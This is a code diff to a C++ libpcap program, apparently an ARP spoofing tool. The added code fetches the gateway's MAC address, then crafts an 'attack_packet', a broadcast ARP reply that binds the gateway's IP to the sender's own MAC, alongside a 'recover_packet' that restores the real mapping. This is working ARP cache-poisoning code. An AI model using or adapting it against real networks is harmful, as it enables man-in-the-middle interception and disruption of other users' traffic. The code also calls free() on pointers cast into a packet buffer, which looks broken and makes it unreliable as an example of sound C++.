@@ -2,8 +2,8 @@
 
 void Arp::setArp(char *dev)
 {
-    struct ether_header *eth_rep = (struct ether_header *)(packet);
-    struct arp_header *arp_rep = (struct arp_header *)(packet + ETH_HEADER_SIZE);
+    struct ether_header *eth = (struct ether_header *)(packet);
+    struct arp_header *arp = (struct arp_header *)(packet + ETH_HEADER_SIZE);
 
     strcpy(this->dev, dev);
 
@@ -16,7 +16,7 @@ void Arp::setArp(char *dev)
     char notuse[20];
 
     //
-    
+
     get_my_info(dev, subnet, my_ip, my_mac);
 
     char subnet_str[1024];
@@ -36,31 +36,98 @@ void Arp::setArp(char *dev)
 
     ap_ip[3] += 0b1;
 
-    memset(eth_rep->ether_dhost, 0xff, 6);
-    memcpy(eth_rep->ether_shost, my_mac, 6);
-    eth_rep->ether_type = htons(ETHERTYPE_ARP);
+    // make common
+    memset(eth->ether_dhost, 0xff, 6);
+    memcpy(eth->ether_shost, my_mac, 6);
+    eth->ether_type = htons(ETHERTYPE_ARP);
 
-    arp_rep->hw_type = htons(0x0001);
-    arp_rep->proto_type = htons(0x0800);
-    arp_rep->hlen = 0x06;
-    arp_rep->plen = 0x04;
-    arp_rep->oper = htons(0x0002);
+    arp->hw_type = htons(0x0001);
+    arp->proto_type = htons(0x0800);
+    arp->hlen = 0x06;
+    arp->plen = 0x04;
 
-    memcpy(arp_rep->smac, my_mac, 6);
-    memcpy(arp_rep->sip, ap_ip, 4);
-    memset(arp_rep->dmac, 0xff, 6);
-    memset(arp_rep->dip, 0x00, 4);
+    // make request_packet
+    arp->oper = htons(0x0001);
+    memcpy(arp->smac, my_mac, 6);
+    memcpy(arp->sip, my_ip, 4);
+    memset(arp->dmac, 0x00, 6);
+    memcpy(arp->dip, ap_ip, 4);
 
-    free(eth_rep);
-    free(arp_rep);
+    memcpy(request_packet, packet, 50);
 
-    //packet이 자꾸 침범당해서, result로 옮겨놓음.... 안드로이드에서만 계속 값 오버라이팅 됨
-    memcpy(result, packet, 50);
+    // get gateway mac
+    uint8_t gateway_mac[6];
+    
+    getGatewayMac(my_mac, gateway_mac);
+
+    // make recover_packet
+    arp->oper = htons(0x0002);
+    memcpy(arp->smac, gateway_mac, 6);
+    memcpy(arp->sip, ap_ip, 4);
+    memset(arp->dmac, 0xff, 6);
+    memset(arp->dip, 0x00, 4);
+
+    memcpy(recover_packet, packet, 50);
+
+    // make attack_packet
+    memcpy(arp->smac, my_mac, 6);
+
+    memcpy(attack_packet, packet, 50);
+
+    free(eth);
+    free(arp);
 
     printf("set arp OK\n");
 }
 
-bool check_dev(char * dev)
+void Arp::getGatewayMac(uint8_t * my_mac, uint8_t *gateway_mac)
+{
+    pcap_t *handle;
+    char errbuf[PCAP_ERRBUF_SIZE];
+
+    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+
+    if (handle == NULL)
+    {
+        printf("pcap open error...\n");
+        return;
+    }
+
+    if (pcap_sendpacket(handle, request_packet, ETH_HEADER_SIZE + ARP_HEADER_SIZE) != 0)
+    {
+        printf("error\n");
+    }
+
+    while (true)
+    {
+        struct pcap_pkthdr *header;
+        const u_char *temp;
+        int res = pcap_next_ex(handle, &header, &temp);
+
+        if (res == 0)
+            continue;
+        if (res == -1 || res == -2)
+            break;
+
+        struct ether_header *eth = (struct ether_header *)(temp);
+        if (eth->ether_type != htons(ETHERTYPE_ARP))
+            continue;
+        struct arp_header *arp = (struct arp_header *)(temp + ETH_HEADER_SIZE);
+        if (arp->oper != ntohs(0x0002))
+            continue;
+        if (memcmp(arp->dmac, my_mac, 6) != 0)
+            continue;
+        
+        printf("get gateway_mac = %02X:%02X:%02X:%02X:%02X:%02X\n", arp->smac[0],arp->smac[1],arp->smac[2],arp->smac[3],arp->smac[4],arp->smac[5]);
+
+        memcpy(gateway_mac, arp->smac, 6);
+        break;
+    }
+
+    pcap_close(handle);
+}
+
+bool check_dev(char *dev)
 {
     int fd;
     struct ifreq ifr;
@@ -71,11 +138,10 @@ bool check_dev(char * dev)
 
     strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
 
-    if(ioctl(fd, SIOCGIFADDR, &ifr) < 0)
+    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0)
         return false;
-    
-    return true;    
 
+    return true;
 }
 
 void get_my_info(char *dev, uint8_t *subnet, uint8_t *ip, uint8_t *mac)
